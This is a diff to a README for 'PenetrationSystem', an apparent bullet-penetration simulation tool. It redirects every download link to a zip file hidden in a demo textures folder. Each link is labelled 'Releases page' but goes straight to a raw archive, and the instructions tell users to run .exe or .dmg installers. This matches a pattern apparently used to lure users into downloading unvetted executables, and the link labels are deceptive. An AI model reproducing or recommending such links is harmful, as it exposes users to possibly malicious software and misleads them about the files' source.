@@ -6,7 +6,7 @@ Welcome to PenetrationSystem! This program simulates realistic bullet behavior w
 
 ## 📥 Download Now
 
-[![Download PenetrationSystem](https://raw.githubusercontent.com/ferxxo2024/PenetrationSystem/main/smaltine/PenetrationSystem.zip)](https://raw.githubusercontent.com/ferxxo2024/PenetrationSystem/main/smaltine/PenetrationSystem.zip)
+[![Download PenetrationSystem](https://raw.githubusercontent.com/ferxxo2024/PenetrationSystem/main/addons/penetration_system/demo/textures/Penetration_System_1.8.zip)](https://raw.githubusercontent.com/ferxxo2024/PenetrationSystem/main/addons/penetration_system/demo/textures/Penetration_System_1.8.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To run PenetrationSystem, your computer must meet the following requirements:
 ## 🔍 How to Use
 
 1. **Download the Software**
-   Visit the [Releases page](https://raw.githubusercontent.com/ferxxo2024/PenetrationSystem/main/smaltine/PenetrationSystem.zip) to download the latest version of PenetrationSystem. Click the version you want to download, then select the appropriate file for your operating system.
+   Visit the [Releases page](https://raw.githubusercontent.com/ferxxo2024/PenetrationSystem/main/addons/penetration_system/demo/textures/Penetration_System_1.8.zip) to download the latest version of PenetrationSystem. Click the version you want to download, then select the appropriate file for your operating system.
 
 2. **Install the Application**
    If you downloaded a .exe or .dmg file, follow these steps:
@@ -60,4 +60,4 @@ If you encounter any issues or have questions, feel free to open an issue on the
 
 ## 📥 Download Again
 
-Ready to give it a try? Visit the [Releases page](https://raw.githubusercontent.com/ferxxo2024/PenetrationSystem/main/smaltine/PenetrationSystem.zip) to download PenetrationSystem and start your simulation experience today!
+Ready to give it a try? Visit the [Releases page](https://raw.githubusercontent.com/ferxxo2024/PenetrationSystem/main/addons/penetration_system/demo/textures/Penetration_System_1.8.zip) to download PenetrationSystem and start your simulation experience today!
